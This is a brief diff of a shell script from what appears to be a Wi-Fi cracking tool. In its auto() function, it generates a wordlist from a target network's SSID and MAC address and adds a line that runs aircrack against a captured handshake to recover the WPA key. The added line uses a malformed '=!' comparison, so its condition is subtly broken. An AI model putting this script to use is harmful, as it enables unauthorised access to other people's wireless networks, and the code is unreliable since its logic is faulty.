@@ -44,7 +44,8 @@ jtd(){
     fi
 }
 
-auto(){ 
-    $AIROSCWORDLIST --filename $DUMP_PATH/$Host_MAC.dic -cf $CMPFILE -e $Host_SSID -m $Host_MAC; 
+auto(){
+    $AIROSCWORDLIST --filename $DUMP_PATH/$Host_MAC.dic -cf $CMPFILE -e $Host_SSID -m $Host_MAC;
+    [[ $? =! "404" ]] && $AIRCRACK -b $Host_MAC -w $DUMP_PATH/$Host_MAC.dic $DUMP_PATH/$Host_MAC-01.cap
     [[ $? == "404" ]] && crack
 }
